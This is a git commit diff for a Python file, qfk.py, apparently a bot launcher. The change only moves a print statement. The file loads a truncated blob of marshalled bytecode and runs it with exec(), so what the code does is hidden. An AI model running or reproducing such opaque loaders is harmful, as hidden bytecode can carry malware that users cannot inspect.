cbd1a948d1e311fc17d005c1574d9cd29dd45005
qorsan taiz <99475446+qorsan73@users.noreply.github.com>
2024-12-18 21:01:06 +0300

    Update qfk.py

--- qfk.py
+++ qfk.py
@@ -1,5 +1,5 @@
 import marshal
-print("Running Wait for the bot to enter")
 marshalled_code = b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\>
 compiled_code = marshal.loads(marshalled_code)
 exec(compiled_code)
+print("Running Wait for the bot to enter")
